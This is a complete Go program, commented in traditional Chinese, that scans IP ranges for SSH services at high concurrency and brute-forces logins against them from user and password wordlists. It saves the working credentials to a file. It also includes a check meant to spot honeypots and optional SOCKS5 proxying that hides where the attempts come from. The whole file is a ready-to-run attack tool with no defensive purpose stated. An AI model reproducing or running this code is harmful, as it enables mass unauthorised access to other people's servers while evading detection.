package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

const (
	timeout      = 3 * time.Second
	ipFilename   = "ip.txt"
	portFilename = "port.txt"
	userFile     = "user.txt"
	passFile     = "passwd.txt"
	resultFile   = "success.txt"
	scanWorkers  = 5000 // 端口掃描 worker 數量
	authWorkers  = 2000 // 認證 worker 數量
)

var (
	useProxy     bool
	socks5Addr   string
	// 用於記錄非 SSH 的端口信息，key 為 IP，value 為該 IP 的所有不屬於 SSH 的端口
	notSSHMap    = make(map[string][]int)
	notSSHMutex  sync.Mutex
)

func init() {
	flag.BoolVar(&useProxy, "proxy", false, "是否使用 SOCKS5 代理")
	flag.StringVar(&socks5Addr, "proxyAddr", "127.0.0.1:1080", "SOCKS5 代理地址")
	flag.Parse()
	rand.Seed(time.Now().UnixNano())
}

func main() {
	users, err := readLines(userFile)
	if err != nil {
		fmt.Println("讀取用戶失敗:", err)
		return
	}
	passwords, err := readLines(passFile)
	if err != nil {
		fmt.Println("讀取密碼失敗:", err)
		return
	}

	ports, err := readPorts(portFilename)
	if err != nil {
		fmt.Println("讀取端口失敗:", err)
		return
	}
	if len(ports) == 0 {
		fmt.Println("未解析到任何有效端口，預設使用 port 22")
		ports = []int{22}
	}

	// 原始 IP 通道（從文件中讀取）
	ipChan := readIPFile(ipFilename)
	// 任務通道，每個任務格式為 "ip:port"
	jobs := make(chan string, 10000)
	// 開放的、且返回 SSH banner 的目標通道
	openTargets := make(chan string, 1000)
	// 成功登入結果的通道
	success := make(chan string, 1000)

	var distributeWg, scanWg, authWg sync.WaitGroup

	// 任務分發：根據每個 IP 與解析到的端口列表生成 "ip:port" 任務
	distributeWg.Add(1)
	go func() {
		defer distributeWg.Done()
		distributeJobs(ipChan, jobs, ports)
		close(jobs)
	}()

	// 端口掃描工作池：檢查每個 "ip:port" 是否返回 SSH banner
	for i := 0; i < scanWorkers; i++ {
		scanWg.Add(1)
		go func() {
			defer scanWg.Done()
			for job := range jobs {
				// job 格式 "ip:port"
				parts := strings.Split(job, ":")
				if len(parts) != 2 {
					continue
				}
				ip := parts[0]
				portStr := parts[1]
				if isSSH(ip, portStr) {
					openTargets <- job
				} else {
					// 將不屬於 SSH 的端口記錄到 notSSHMap
					portInt, err := strconv.Atoi(portStr)
					if err != nil {
						continue
					}
					notSSHMutex.Lock()
					notSSHMap[ip] = append(notSSHMap[ip], portInt)
					notSSHMutex.Unlock()
				}
			}
		}()
	}

	// 當掃描工作全部結束後，先進行聚合輸出，再關閉 openTargets
	go func() {
		scanWg.Wait()
		aggregateNotSSH()
		close(openTargets)
	}()

	// 認證工作池：對每個返回 SSH banner 的目標嘗試 SSH 登錄
	for i := 0; i < authWorkers; i++ {
		authWg.Add(1)
		go func() {
			defer authWg.Done()
			for target := range openTargets {
				if loginSSH(target, users, passwords, success) {
					continue
				}
			}
		}()
	}
	go func() {
		authWg.Wait()
		close(success)
	}()

	// 寫入結果文件
	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("無法寫入結果文件:", err)
		return
	}
	defer out.Close()
	for result := range success {
		fmt.Println("[+] 成功登入:", result)
		_, _ = out.WriteString(result + "\n")
	}
	fmt.Println("掃描結束")
}

// distributeJobs 根據每個 IP 以及 ports 列表生成 "ip:port" 任務
func distributeJobs(ipChan <-chan string, jobs chan<- string, ports []int) {
	for ip := range ipChan {
		for _, p := range ports {
			job := fmt.Sprintf("%s:%d", ip, p)
			jobs <- job
		}
	}
}

// isSSH 判斷指定 ip 與 port 是否返回 SSH banner（開頭 "SSH-"）
func isSSH(ip, port string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buffer := make([]byte, 255)
	n, err := conn.Read(buffer)
	if err != nil {
		return false
	}
	data := string(buffer[:n])
	return strings.HasPrefix(data, "SSH-")
}

// loginSSH 嘗試使用 users 與 passwords 中的帳密組合對目標 (ip:port) 進行 SSH 登錄，成功後進行蜜罐檢測（連續 3 次用錯誤帳密登入成功則判為蜜罐）
func loginSSH(target string, users, passwords []string, success chan<- string) bool {
	ip, port, err := net.SplitHostPort(target)
	if err != nil {
		return false
	}
	dialer, err := getDialer()
	if err != nil {
		fmt.Println("代理 dialer 錯誤:", err)
		return false
	}
	for _, user := range users {
		for _, pass := range passwords {
			config := &ssh.ClientConfig{
				User:            user,
				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         timeout,
			}
			conn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
			if err != nil {
				continue
			}
			sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
			if err != nil {
				conn.Close()
				fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", target, user, pass)
				continue
			}
			client := ssh.NewClient(sshConn, chans, reqs)
			// 成功登入後進行蜜罐檢測：3 次錯誤帳密嘗試
			honeypotCount := 0
			for i := 0; i < 3; i++ {
				fakeUser := users[rand.Intn(len(users))]
				fakePass := passwords[rand.Intn(len(passwords))]
				if fakeUser == user && fakePass == pass {
					fakePass = fakePass + "_wrong"
				}
				fakeConfig := &ssh.ClientConfig{
					User:            fakeUser,
					Auth:            []ssh.AuthMethod{ssh.Password(fakePass)},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					Timeout:         timeout,
				}
				fakeConn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
				if err != nil {
					continue
				}
				fakeSSHConn, _, _, err := ssh.NewClientConn(fakeConn, net.JoinHostPort(ip, port), fakeConfig)
				if err == nil {
					honeypotCount++
					fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", target, i+1, fakeUser, fakePass)
					fakeSSHConn.Close()
				} else {
					fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", target, i+1, fakeUser, fakePass)
				}
			}
			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, target, pass)
			if honeypotCount == 3 {
				successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
			}
			fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", target, user, pass)
			success <- successMsg
			client.Close()
			return true
		}
	}
	fmt.Printf("[-] %s 所有帳密組合失敗\n", target)
	return false
}

// getDialer 返回 SOCKS5 代理或直接連線
func getDialer() (proxy.Dialer, error) {
	if useProxy {
		return proxy.SOCKS5("tcp", socks5Addr, nil, proxy.Direct)
	}
	return proxy.Direct, nil
}

// readLines 讀取文件中每一行內容
func readLines(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// readPorts 從 port.txt 中讀取端口配置，支持：
// 1. 單一數字（例如 "22"）
// 2. 範圍（例如 "22-23"）
// 3. 逗號分隔（例如 "1,22,77"）
func readPorts(filename string) ([]int, error) {
	lines, err := readLines(filename)
	if err != nil {
		return nil, err
	}
	portMap := make(map[int]bool)
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.Contains(line, "-") {
			parts := strings.Split(line, "-")
			if len(parts) != 2 {
				continue
			}
			start, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
			end, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
			if err1 != nil || err2 != nil || start > end {
				continue
			}
			for p := start; p <= end; p++ {
				portMap[p] = true
			}
		} else if strings.Contains(line, ",") {
			parts := strings.Split(line, ",")
			for _, part := range parts {
				p, err := strconv.Atoi(strings.TrimSpace(part))
				if err != nil {
					continue
				}
				portMap[p] = true
			}
		} else {
			p, err := strconv.Atoi(line)
			if err != nil {
				continue
			}
			portMap[p] = true
		}
	}
	var ports []int
	for p := range portMap {
		ports = append(ports, p)
	}
	sort.Ints(ports)
	return ports, nil
}

// readIPFile 讀取 ip.txt 中每行的 IP 或 CIDR，並將每個 IP 發送到 channel
func readIPFile(filename string) <-chan string {
	out := make(chan string, 10000)
	go func() {
		defer close(out)
		lines, err := readLines(filename)
		if err != nil {
			fmt.Println("讀取IP文件失敗:", err)
			return
		}
		for _, line := range lines {
			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
					out <- ip.String()
				}
			} else if ip := net.ParseIP(line); ip != nil {
				out <- ip.String()
			} else {
				fmt.Println("無法解析 IP:", line)
			}
		}
	}()
	return out
}

// inc 對 ip 做加 1 處理，用於展開 CIDR 列表
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// aggregateNotSSH 對 notSSHMap 中每個 IP 的非 SSH 端口進行排序、合併連續範圍，並輸出聚合日志
func aggregateNotSSH() {
	notSSHMutex.Lock()
	defer notSSHMutex.Unlock()
	for ip, portList := range notSSHMap {
		if len(portList) == 0 {
			continue
		}
		sort.Ints(portList)
		ranges := groupRanges(portList)
		fmt.Printf("%s 的端口 %s 並非 SSH 服務\n", ip, ranges)
	}
}

// groupRanges 將整數切片合併成連續區間，例如 [1,2,3,5,7,8] 輸出 "1-3,5,7-8"
func groupRanges(ports []int) string {
	if len(ports) == 0 {
		return ""
	}
	var ranges []string
	start, end := ports[0], ports[0]
	for i := 1; i < len(ports); i++ {
		if ports[i] == end+1 {
			end = ports[i]
		} else {
			if start == end {
				ranges = append(ranges, fmt.Sprintf("%d", start))
			} else {
				ranges = append(ranges, fmt.Sprintf("%d-%d", start, end))
			}
			start, end = ports[i], ports[i]
		}
	}
	// 處理最後一個區間
	if start == end {
		ranges = append(ranges, fmt.Sprintf("%d", start))
	} else {
		ranges = append(ranges, fmt.Sprintf("%d-%d", start, end))
	}
	return strings.Join(ranges, ",")
}

